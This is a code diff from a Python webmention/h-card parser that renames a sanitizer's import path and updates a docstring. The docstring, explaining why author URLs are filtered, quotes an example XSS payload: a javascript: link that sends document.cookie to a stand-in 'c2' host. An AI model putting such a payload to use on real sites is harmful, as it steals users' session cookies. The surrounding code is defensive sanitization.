@@ -28,7 +28,7 @@ import re
 from collections.abc import Iterable
 from urllib.parse import urljoin, urlparse
 
-from bragi.core.safe_redirect import safe_external_url
+from bragi.core.safe_urls import safe_external_url
 
 # Matches `<a href="..." ...>` with single or double quotes.
 _HREF_RE = re.compile(r"""<a\s[^>]*href\s*=\s*(["'])(?P<url>[^"']+)\1""", re.IGNORECASE)
@@ -162,7 +162,7 @@ def extract_hcard(html: str, base_url: str) -> tuple[str | None, str | None, str
     a real parser.
 
     `author_url` and `author_photo` are gated through
-    `safe_external_url` (from `bragi.core.safe_redirect`) so an
+    `safe_external_url` (from `bragi.core.safe_urls`) so an
     attacker-controlled source page that advertises an
     `<a class="h-card" href="javascript:fetch('//c2/'+document.cookie)">`
     can't smuggle a `javascript:` URL into `Webmention.author_url`.
